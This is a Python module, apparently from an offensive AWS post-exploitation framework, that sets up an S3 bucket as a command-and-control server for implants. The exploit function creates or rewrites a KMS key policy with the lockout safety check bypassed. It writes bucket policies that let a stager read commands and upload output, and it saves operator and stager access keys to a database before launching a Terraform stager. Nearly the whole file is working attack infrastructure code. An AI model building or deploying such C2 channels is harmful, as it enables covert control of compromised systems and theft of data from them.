import json
import os
import string
import sys
import random

import boto3
from mongoengine import DoesNotExist

from core.database.models import S3C2Listener
import core.module.stager.aws_s3_c2_terraform
import requests

author = {
    "name":"gl4ssesbo1",
    "twitter":"https://twitter.com/gl4ssesbo1",
    "github":"https://github.com/gl4ssesbo1",
    "blog":"https://www.pepperclipp.com/"
}

needs_creds = True

variables = {
    "SERVICE": {
        "value": "s3",
        "required": "true",
        "description": "The service that will be used to run the module. It cannot be changed."
    },
    "BUCKETNAME": {
        "value": "",
        "required": "true",
        "description": "The bucket name to use as C2. If the bucket does not exist, it will be created."
    },
    "OUTPUTKEY": {
        "value": "home.html",
        "required": "true",
        "description": "The the output file. By default it's 'output'"
    },
    "COMMANDKEY": {
        "value": "index.html",
        "required": "true",
        "description": "The filename where the command is hosted. By default is 'index.html'"
    },
    "KMS-KEY-ARN": {
        "value": "",
        "required": "false",
        "description": "The filename where the command is hosted. By default is 'index.html'"
    },
    "STAGER-ACCESS-KEY": {
        "value": "",
        "required": "true",
        "description": "The filename where the command is hosted. By default is 'index.html'"
    },
    "STAGER-SECRET-KEY": {
        "value": "",
        "required": "true",
        "description": "The filename where the command is hosted. By default is 'index.html'"
    },
    "STAGER-TYPE": {
        "value": "terraform",
        "required": "true",
        "description": "The filename where the command is hosted. By default is 'terraform'"
    }
}
description = "Based on the book How to Hack like a Ghost, where an S3 bucket is used as a C2 Server."

aws_command = "None"

stagers = [
    "terraform"
]

calls = [
    "s3:CreateBucket",
    "s3:PutBucketPolicy",
    "s3:PutBucketVersioning",
    "s3:PutBucketEncryption",
    "kms:CreateKey",
    "kms:PutKeyPolicy",
    "kms:Encrypt"
]

def exploit(profile, workspace):
    bucket = variables['BUCKETNAME']['value']
    commandkey = variables['COMMANDKEY']['value']
    outputkey = variables['OUTPUTKEY']['value']
    kmskey = variables['KMS-KEY-ARN']['value']

    access_key = os.environ.get('AWS_ACCESS_KEY')
    secret_key = os.environ.get('AWS_SECRET_KEY')
    region = os.environ.get('AWS_REGION')

    stager_access_key = variables['STAGER-ACCESS-KEY']['value']
    stager_secret_key = variables['STAGER-SECRET-KEY']['value']
    stager_type = variables['STAGER-TYPE']['value']

    if not stager_type in stagers:
        return {"error": f"{stager_type} is not a valid stager type for this module. Look at stagers list."}

    serverargs = {
        "service_name": "sts",
        "region_name": region,
        "aws_access_key_id": access_key,
        "aws_secret_access_key": secret_key
    }

    if os.environ.get('AWS_SESSION_TOKEN'):
        return {"error": "Please use permanent credentials, not temporary"}

    args = {
        "service_name": "sts",
        "region_name": region,
        "aws_access_key_id": stager_access_key,
        "aws_secret_access_key": stager_secret_key
    }

    serverprofile = boto3.client(
        **serverargs
    )

    stagerprofile = boto3.client(
        **args
    )

    try:
        stageruser = stagerprofile.get_caller_identity()["Arn"]
    except:
        return {"error": f"Stager Credentials error: {sys.exc_info()[1]}"}

    try:
        serveruser = serverprofile.get_caller_identity()["Arn"]
    except:
        return {"error": f"Stager Credentials error: {sys.exc_info()[1]}"}

    if not checkBucket(bucket):
        status = setupBucket(
            profile=profile,
            bucketname=bucket,
            commandkey=commandkey,
            outputkey=outputkey,
            stageruser=stageruser,
            kmskey=kmskey,
            serveruser=serveruser
        )
        if status['Status'] == "Successfully Created":
            dbdata = {
                "listener_bucket_name": bucket,
                "listener_command_file": commandkey,
                "listener_output_file": outputkey,
                "listener_access_key": access_key,
                "listener_secret_key": secret_key,
                "listener_particle_access_key": stager_access_key,
                "listener_particle_secret_key": stager_secret_key,
                "listener_region": region,
                "listener_kms_key_arn": status["KMSKey"]
            }

            if os.environ.get('AWS_SESSION_TOKEN'):
                dbdata['listener_session_token'] = os.environ.get('AWS_SESSION_TOKEN')

            try:
                s3c2data = S3C2Listener.objects.get(listener_bucket_name=bucket)
                s3c2data.modify(**dbdata)
                s3c2data.save()

            except DoesNotExist:
                S3C2Listener(**dbdata).save()

            except:
                e = sys.exc_info()
                return {"error": "Error from module: {}".format(str(e))}, 500

            core.module.stager.aws_s3_c2_terraform.variables = {
                "SERVICE": {
                    "value": "none",
                    "required": "true",
                    "description": "The service that will be used to run the module. It cannot be changed."
                },
                "LISTENER-BUCKET-NAME": {
                    "value": bucket,
                    "required": "true",
                    "description": "The listener bucket name to use as C2."
                },
                "OUTPUT-FILE-NAME": {
                    "value": outputkey,
                    "required": "true",
                    "description": "The name of the output file to be dumped inside ./stager directory."
                }
            }
            print(outputkey)
            stagerData = core.module.stager.aws_s3_c2_terraform.exploit(None)
            if "error" in stagerData:
                return stagerData
            else:
                return stagerData["ModuleName"]

        else:
            return {
                'error': f"Error from module: {status['Error']}"
            }
    else:
        return {
            'BucketName': {
                'BucketName': bucket,
                'Status': "Bucket Exists. C2 Setup."
            }
        }

def checkBucket(bucketname):
    statuscode = requests.get(f"https://{bucketname}.s3.amazonaws.com").status_code
    if statuscode == 200 or statuscode == 403:
        return True
    return False

def setupBucket(profile, bucketname, commandkey, outputkey, stageruser, kmskey, serveruser):
    try:
        access_key = os.environ.get('AWS_ACCESS_KEY')
        secret_key = os.environ.get('AWS_SECRET_KEY')
        region = os.environ.get('AWS_REGION')
        stsargs = {
            "service_name": "sts",
            "region_name": region,
            "aws_access_key_id": access_key,
            "aws_secret_access_key": secret_key
        }
        stsprofile = boto3.client(
            **stsargs
        )

        accountid = stsprofile.get_caller_identity()['Account']

        kmsargs = {
            "service_name": "kms",
            "region_name": region,
            "aws_access_key_id": access_key,
            "aws_secret_access_key": secret_key
        }
        kmsprofile = boto3.client(
            **kmsargs
        )
        if kmskey == "":
            kmskey = kmsprofile.create_key(
                Policy=json.dumps(
                {
                    "Version": "2012-10-17",
                    "Statement": [
                        {
                            "Sid": "Statement1",
                            "Effect": "Allow",
                            "Principal": {
                                "AWS": stageruser
                            },
                            "Action": ["kms:Encrypt", "kms:Decrypt"],
                            "Resource": kmskey
                        },
                        {
                            "Sid": "Statement2",
                            "Effect": "Allow",
                            "Principal": {
                                "AWS": serveruser
                            },
                            "Action": [
                                "kms:*"
                            ],
                            "Resource": [
                                kmskey
                            ]
                        },
                        {
                            "Sid": "Enable IAM User Permissions",
                            "Effect": "Allow",
                            "Principal": {
                                "AWS": f"arn:aws:iam::{accountid}:root"
                            },
                            "Action": "kms:*",
                            "Resource": "*"
                        }
                    ]
                },
                ),
                BypassPolicyLockoutSafetyCheck=True
            )['KeyMetadata']['Arn']
        else:
            kmsprofile.put_key_policy(
                Policy=json.dumps(
                {
                    "Version": "2012-10-17",
                    "Statement": [
                        {
                            "Sid": "Statement1",
                            "Effect": "Allow",
                            "Principal": {
                                "AWS": stageruser
                            },
                            "Action": ["kms:Encrypt", "kms:Decrypt"],
                            "Resource": kmskey
                        },
                        {
                            "Sid": "Statement2",
                            "Effect": "Allow",
                            "Principal": {
                                "AWS": serveruser
                            },
                            "Action": [
                                "kms:*"
                            ],
                            "Resource": [
                                kmskey
                            ]
                        },
                        {
                            "Sid": "Enable IAM User Permissions",
                            "Effect": "Allow",
                            "Principal": {
                                "AWS": f"arn:aws:iam::{accountid}:root"
                            },
                            "Action": "kms:*",
                            "Resource": "*"
                        }
                    ]
                },
                ),
                BypassPolicyLockoutSafetyCheck=True
            )

        bucketPolicy = json.dumps(
            {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Sid": "Statement1",
                        "Effect": "Allow",
                        "Principal": {
                            "AWS": stageruser
                        },
                        "Action": "s3:GetObject",
                        "Resource": f"arn:aws:s3:::{bucketname}/*/{commandkey}"
                    },
                    {
                        "Sid": "Statement2",
                        "Effect": "Allow",
                        "Principal": {
                            "AWS": serveruser
                        },
                        "Action": [
                            "s3:*"
                        ],
                        "Resource": [
                            f"arn:aws:s3:::{bucketname}/*/{outputkey}",
                            f"arn:aws:s3:::{bucketname}"
                        ]
                    },

                    {
                        "Sid": "Statement3",
                        "Effect": "Allow",
                        "Principal": {
                            "AWS": stageruser
                        },
                        "Action": [
                            "s3:PutObject"
                        ],
                        "Resource": f"arn:aws:s3:::{bucketname}/*/{outputkey}"
                    }
                ]
            }
        )

        profile.create_bucket(
            Bucket=bucketname
        )

        profile.put_bucket_encryption(
            Bucket=bucketname,
            ServerSideEncryptionConfiguration={
                'Rules': [
                    {
                        'ApplyServerSideEncryptionByDefault': {
                            'SSEAlgorithm': 'aws:kms',
                            'KMSMasterKeyID': kmskey
                        },
                        'BucketKeyEnabled': True
                    },
                ]
            },
        )

        profile.put_bucket_policy(
            Bucket=bucketname,
            Policy=bucketPolicy
        )

        profile.put_bucket_versioning(
            Bucket=bucketname,
            VersioningConfiguration={
                'Status': 'Enabled'
            }
        )
        print(f"Key: {kmskey}")
        return {
            'Status': "Successfully Created",
            "KMSKey": kmskey
        }
    except:
        return {
            'Status': "Error Creating",
            'Error': str(sys.exc_info())
        }

def thebucket():
    bucketPolicy = """
        {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "Statement1",
                    "Effect": "Allow",
                    "Principal": {
                        "AWS": stageruser
                    },
                    "Action": "s3:GetObject",
                    "Resource": f"arn:aws:s3:::{bucketname}/*/{commandkey}"
                },
                {
                    "Sid": "Statement1",
                    "Effect": "Allow",
                    "Principal": {
                        "AWS": serveruser
                    },
                    "Action": "s3:GetObject",
                    "Resource": f"arn:aws:s3:::{bucketname}/*/{outputkey}"
                },
                {
                    "Sid": "Statement1",
                    "Effect": "Allow",
                    "Principal": {
                        "AWS": serveruser
                    },
                    "Action": "kms:Decrypt",
                    "Resource": kmskey
                },
                {
                    "Sid": "Statement1",
                    "Effect": "Allow",
                    "Principal": {
                        "AWS": stageruser
                    },
                    "Action": "kms:Encrypt",
                    "Resource": kmskey
                },
                {
                    "Sid": "Statement2",
                    "Effect": "Allow",
                    "Principal": {
                        "AWS": "*"
                    },
                    "Action": [
                        "s3:PutObject"
                    ],
                    "Resource": f"arn:aws:s3:::{bucketname}/*/{outputkey}"
                }
            ]
        }
    """